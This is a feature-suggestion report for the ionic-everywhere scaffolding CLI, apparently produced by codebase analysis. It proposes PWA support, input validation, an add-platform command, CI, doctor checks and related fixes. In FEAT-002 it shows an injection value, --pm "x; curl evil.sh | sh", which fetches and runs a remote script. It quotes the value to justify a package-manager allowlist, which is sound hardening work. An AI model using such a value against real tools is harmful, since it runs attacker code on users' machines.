# Feature Suggestions — @involvex/ionic-everywhere

> Generated by codebase analysis on 2026-08-26.
> Scope analyzed: `packages/ionic-everywhere/src/*` (cli, new, scaffold, doctor, util),
> `templates/default/**`, `tests/*`, `scripts/cli-test.mjs`, `reference-app/NOTES.md`,
> root tooling (`package.json`, eslint/vitest configs).
>
> **Status update (2026-08-26):** FEAT-001 (PWA), FEAT-002 (input validation),
> FEAT-003 (`add` command), FEAT-004 (icon/splash assets), FEAT-005 (streaming
> subprocess runner) and the P0 TypeScript fix are **implemented**; FEAT-011's
> registry drift-guard landed as part of FEAT-003. Remaining items below are open.

## Executive summary

The CLI core is solid: token replacement, PM script rewriting, platform pruning, and
environment checks are all unit-tested, and the reference-app verification loop is a
real strength. The biggest opportunities are:

1. **Closing claim/reality gaps** — the README markets "Web / PWA" and the Dashboard
   card says "Browser / PWA", but the template has no web manifest or service worker.
2. **Security hardening** — user-supplied `--pm` / `--app-id` / `--name` values are
   interpolated into `execSync` command strings and written into generated files with
   no validation or escaping.
3. **Lifecycle commands** — scaffolding is a one-shot today; there is no `add` command
   to attach Android/Electron to an existing project later, even though the outro text
   tells users to do it manually.
4. **Roadmap items that are cheap to land** — icon/splash generation, optional
   templates, and repo CI are all listed in the README roadmap and have low effort.

### FEAT-001 — PWA support in the generated app

- **Files:** `packages/ionic-everywhere/templates/default/package.json`,
  `templates/default/index.html`, `templates/default/vite.config.ts`
- **Current state:** No `manifest.webmanifest`, no service worker, no
  `vite-plugin-pwa`. Yet `README.md` line 66 says Web = "static host / PWA" and
  `DashboardPage.tsx` advertises "Browser / PWA". Users who take the PWA path get a
  broken promise.
- **Suggested improvement:** Add `vite-plugin-pwa` to the template devDependencies,
  register a manifest (name/theme from tokens is not possible at build time, but
  `__APP_NAME__` works because Vite config is tokenized… note `vite.config.ts` is _not_
  in `TEXT_FILES` — add it if you tokenize it, see FEAT-011), and enable
  `registerType: 'autoUpdate'`. Keep `base: './'` intact (AGENTS.md gotcha #5).
- **Example (`vite.config.ts`):**

  ```ts
  import {VitePWA} from 'vite-plugin-pwa'

  export default defineConfig({
  	plugins: [react(), VitePWA({registerType: 'autoUpdate'})],
  	base: './',
  })
  ```

- **Why high priority:** It is the cheapest way to make the headline claim true, and
  installability is a common evaluator's first check.

### FEAT-002 — Validate and sanitize CLI inputs

- **Files:** `packages/ionic-everywhere/src/new.ts` (lines 151–153, 208, 222, 238),
  `src/util.ts` (`parseFlags`), `src/cli.ts` (lines 78–89)
- **Current state:**
  - `run()` executes `execSync(cmd)` where `cmd` embeds `cfg.pm` verbatim:
    `` `${pmRun(cfg.pm)} cap add android` ``. A value like `--pm "x; curl evil.sh | sh"`
    (or `&& …`) is executed. This is a local tool, but scaffold CLIs are frequently run
    from package scripts, docs copy-paste, and CI where argv may be influenced.
  - `flags.pm` accepts any string; an invalid value silently produces a broken
    generated `package.json` (via `applyRunner`) instead of an error.
  - An invalid `--app-id` passed as a flag silently falls back to the derived id
    (`new.ts` line 133) with no warning.
  - `appName` is written into `capacitor.config.ts` unescaped; Capacitor copies it into
    Android `strings.xml`, where `&`, `<`, `"` break the XML build.
- **Suggested improvement:**
  - Allowlist the PM: `const PMS = ['bun','npm','pnpm','yarn'] as const` and reject
    anything else in `resolveConfig()` before it reaches `run()`.
  - Warn-and-replace (or hard-fail with `--yes`) when a provided `appId` fails
    `isValidAppId`.
  - Escape or reject `appName` values containing XML-unsafe characters
    (`/[&<>"']/`), or escape them when writing `capacitor.config.ts`.
- **Example:**

  ```ts
  const VALID_PMS = new Set(['bun', 'npm', 'pnpm', 'yarn'])
  if (opts.pm && !VALID_PMS.has(opts.pm))
  	die(
  		`Unsupported --pm "${opts.pm}". Choose one of: ${[...VALID_PMS].join(', ')}`,
  	)
  ```

- **Why high priority:** Small diff, eliminates a real injection vector and two silent
  failure modes.

### FEAT-003 — `add <platform>` command for existing projects

- **Files:** new `src/add.ts`; dispatch table in `src/cli.ts`; reuse helpers from
  `src/new.ts` / `src/scaffold.ts`
- **Current state:** Scaffolding is one-shot. If a user chose `--no-electron`, the only
  guidance is the outro hint "add desktop later: `<pm> cap add @capawesome/capacitor-electron`"
  (`new.ts` lines 296–300). That manual path misses the non-obvious steps the CLI
  automates today: `applyWorkspaces()` after `cap add`, the follow-up root reinstall,
  and `prunePlatformScripts()` reversal (restoring pruned scripts).
- **Suggested improvement:** Implement `ionic-everywhere add android|desktop` that:
  1. reads the existing `package.json` + `capacitor.config.ts`,
  2. runs `cap add <full platform name>` (AGENTS.md gotcha #3),
  3. re-adds pruned scripts (store the canonical script set in one shared constant used
     by both the template and pruning, so restore == template minus nothing),
  4. applies workspaces + reinstalls for Electron.
- **Why high priority:** It converts a dead-end ("you should have chosen both") into a
  supported flow, and reuses ~80% of `runNew`.

### FEAT-004 — Icon and splash generation in scaffold

- **Files:** `templates/default/assets/` (new), `templates/default/package.json`,
  `src/new.ts`
- **Current state:** Roadmap item ("Icon/splash generation in scaffold"). Generated
  apps ship default Capacitor/Electron icons.
- **Suggested improvement:** Ship placeholder `assets/icon-only.png`,
  `icon foreground/background`, `splash.png` + `splash-dark.png` (1024px) in the
  template, and add a `"assets": "<pm-dlx> @capacitor/assets generate --android"` style
  script (use the existing `pmRun()` helper). Optionally prompt during `new`:
  "Generate icons now?" and run it post-`cap add`. Document replacing the placeholders
  as step zero in the generated README.
- **Why high priority:** Listed on the roadmap, mostly mechanical, huge perceived
  polish win for every generated app.

### FEAT-005 — Streaming subprocess output and failure logs

- **Files:** `packages/ionic-everywhere/src/new.ts` (`run()`, lines 151–153)
- **Current state:** `execSync(cmd, {cwd, stdio: 'pipe'})` buffers all output (default
  `maxBuffer` ≈ 1 MB — a chatty first `bun install` with Electron download can exceed
  it), shows nothing while long steps run, and on failure `die()` prints only the last
  3 lines of stderr (`err.message.split('\n').slice(-3)`).
- **Suggested improvement:** Switch to `spawnSync` with output captured to a log file
  under the target dir (e.g. `.ionic-everywhere/install.log`), stream tail progress via
  the spinner, and print the log path on failure. Alternative minimal fix: raise
  `maxBuffer: 10 * 1024 * 1024` and write `err.stdout/stderr` to a file before dying.
- **Why high priority:** Install/platform failures are the most likely support burden;
  today they are nearly undebuggable.

### FEAT-006 — CI for this repository

- **Files:** new `.github/workflows/ci.yml`
- **Current state:** `.github/` contains only `FUNDING.yml` and a `modernize/` folder —
  no workflows. README roadmap lists "GitHub Actions matrix building all targets".
  Nothing enforces `bun run verify` + `build` on PRs.
- **Suggested improvement:** Start with a fast job matrix:
  - `lint-test`: `oven-sh/setup-bun` → `bun install` → `bun run verify` → `tsc --noEmit -p packages/ionic-everywhere/tsconfig.json` → `bun run build`
  - `scaffold-smoke`: run `scripts/cli-test.mjs` (already end-to-end; needs JDK/SDK only if you later assert APK builds — keep it `--no-install`-friendly or cache bun store).
    Add the full three-target artifact build as a separate, manual (`workflow_dispatch`)
    workflow so CI stays green without Android SDK/JDK secrets on every push.
- **Why high priority:** The project's own AGENTS.md checklist ("verify passes, build
  passes") currently relies on local discipline.

### FEAT-007 — Working settings persistence + dark mode

- **Files:** `templates/default/src/pages/SettingsPage.tsx`, `templates/default/package.json`
- **Current state:** The Settings toggles are decorative (`<IonToggle checked>Notifications</IonToggle>`
  renders static state; flipping does nothing). `ListPage` renders hardcoded items.
- **Suggested improvement:** Add `@capacitor/preferences` (works on web, Android, and
  the Electron WebView) plus a small `useStoredState<T>(key, initial)` hook; wire the
  toggles to real keys and add a Dark Mode toggle driving
  `document.documentElement.classList.toggle('ion-palette-dark')` (Ionic 9 dark palette)
  persisted under `theme`. Extend the same hook to make ListPage a working
  add/remove list — this demonstrates cross-platform persistence, which is exactly the
  promise of the stack.

### FEAT-008 — Template variants via `--template`

- **Files:** `src/new.ts`, `src/cli.ts` (help text), `templates/` layout
- **Current state:** Single `templates/default`; roadmap lists drawer-only/tabs-only.
- **Suggested improvement:** Promote navigation to a data-driven module
  (`src/nav/menuItems.ts` already half-exists in `AppMenu.tsx` lines 23–27 — tabs in
  `App.tsx` duplicate the same array). Then variants become token/flag-driven
  permutations of one template rather than full template copies (less drift to
  maintain, respects AGENTS.md warning about keeping template + tests in sync).
  Validate `--template` against a known set (same pattern as FEAT-002).

### FEAT-009 — Live-reload desktop development

- **Files:** `electron/` platform dir (Capawesome-owned), template scripts
- **Current state:** Roadmap item. Desktop dev requires full `build && sync` per change
  (`predesktop` chain).
- **Suggested improvement:** Two viable approaches verified against the Capawesome
  pipeline in `reference-app/NOTES.md` (§5): point the Electron main window at
  `http://localhost:5173` when `VITE_DEV_SERVER_URL` is set (a tiny patch step the CLI
  applies post-`cap add`), or use `vite build --watch` + `cap sync watch`. Mark this
  experimental behind `desktop:dev` until validated in `reference-app/` first (per
  AGENTS.md workflow).
- **Note:** Highest-value DX item, but highest risk of fighting the platform generator —
  prototype in `reference-app/` before touching the template.

### FEAT-010 — `doctor` enhancements

- **File:** `packages/ionic-everywhere/src/doctor.ts`
- **Current state:** Checks Node ≥ 20, any PM, git, JAVA_HOME ≥ 21, ANDROID_HOME.
  Gaps:
  - If `JAVA_HOME` is unset, no attempt is made to find `java` on PATH (common on macOS
    `/usr/bin/java` stubs and Linux) — the check reports fail without probing
    (`java -version` on PATH would still detect JDK 21 installs managed by sdkman etc.).
  - No check for `adb`/`sdkmanager` inside ANDROID_HOME (a set-but-broken SDK passes).
  - Machine-readable output absent; hard to use in CI or scripts.
- **Suggested improvement:**
  ```ts
  // cli.ts
  case 'doctor': {
    const report = runChecks()
    if (flags.json) console.log(JSON.stringify(report, null, 2))
    else console.log(formatReport(report))
    return report.some(c => c.required && !c.ok) ? 1 : 0
  }
  ```
  Also probe `java -version` via PATH when `JAVA_HOME` is missing, and verify
  `%ANDROID_HOME%\platform-tools\adb` exists. Non-zero exit on required-check failure
  makes `doctor` usable as a CI preflight gate.

### FEAT-011 — Token detection instead of hardcoded `TEXT_FILES`

- **File:** `packages/ionic-everywhere/src/scaffold.ts` (line 28)
- **Current state:** `TEXT_FILES = ['package.json', 'capacitor.config.ts', 'index.html']`.
  Adding any future tokenized file (e.g. `tauri.conf.json`, `vite.config.ts` for FEAT-001)
  requires remembering to extend this list; forgetting yields shipped `__APP_*__` tokens.
- **Suggested improvement:** After `cpSync`, walk the copied tree (skip binaries by
  extension allowlist: `.png .ico .icns .jar .apk`…) and rewrite any file whose content
  matches `/__APP_[A-Z_]+__/`. Unit test: drop a decoy `src/tokenized.json` into the
  template and assert it gets rewritten. Keeps `applyTokens()` unchanged.

### FEAT-012 — Optional testing scaffold in generated apps

- **Files:** `templates/default/package.json`, new `--tests` prompt/flag
- **Current state:** Generated apps have lint/format/typecheck gates but zero test
  infrastructure — ironic given this repo's own testing discipline.
- **Suggested improvement:** Add opt-in vitest + `@testing-library/react` +
  `jsdom` deps, a smoke test rendering `<App />`, and `test`/`test:watch` scripts
  (route through `applyRunner` like other scripts). Default to yes in interactive mode,
  off under `--yes` to preserve current scaffold shape (and current snapshot-ish tests).

### FEAT-013 — Cleanup on failed scaffold

- **File:** `packages/ionic-everywhere/src/new.ts`
- **Current state:** If `bun install` or `cap add` fails mid-flow, the target directory
  keeps a partial project (template files, maybe node_modules). Re-running fails with
  "Directory already contains a project" / "not empty", forcing manual deletion.
- **Suggested improvement:** Wrap the post-copy phases in try/catch; on failure ask
  "Remove the partially created project? [Y/n]" (auto-yes under `--yes`) and
  `rmSync(targetDir, {recursive: true, force: true})` unless `--keep-on-failure`.

### Notes on selected items

- **FEAT-015:** `detectPm()` (`util.ts` lines 33–41) returns `'bun'` as the universal
  default — even when neither the user agent nor `commandExists('bun')` supports it. On
  npm-only machines the scaffold then runs `bun x cap add …` and dies. Fall back to
  `'npm'` when bun isn't on PATH (doctor already knows how to check).
- **FEAT-017:** `applyRunner` (`scaffold.ts` lines 40–50) mutates its `scripts`
  argument. Harmless today (single call site), but a `for (const key of Object.keys({...scripts}))`
  clone makes it safe for reuse in the future `add` command (FEAT-003/FEAT-019).
- **FEAT-018:** `cli.ts`'s `defaultAction()` bin-name sniffing and `resolveConfig()`'s
  prompt-vs-flag precedence are the least-covered logic in the repo (util/scaffold/doctor
  have good coverage; the flow glue has none). Extract `defaultAction` and
  `resolveConfig` into pure/injectable form and test the flag-precedence matrix
  (`--yes` + explicit flags, invalid ids, missing dir).
- **FEAT-019:** `prunePlatformScripts` (`scaffold.ts` lines 102–142) rebuilds `sync`
  via regex surgery and duplicates the script inventory that also lives in
  `templates/default/package.json` and (future) FEAT-003's restore path. A single
  exported `PLATFORM_SCRIPTS` map consumed by all three would eliminate drift — this is
  exactly the class of bug AGENTS.md gotcha #6 warns about.
- **FEAT-016:** Prerequisite for the roadmap publish item: `prepublishOnly` exists
  (`packages/ionic-everywhere/package.json` line 32) but `files` ships `dist` built with
  `typescript ^7.0.2` while the root pins `^5.9.3` — reconcile the version split (likely
  intentional tsgo trial, worth a comment) and add OIDC-provenance publishing once public.
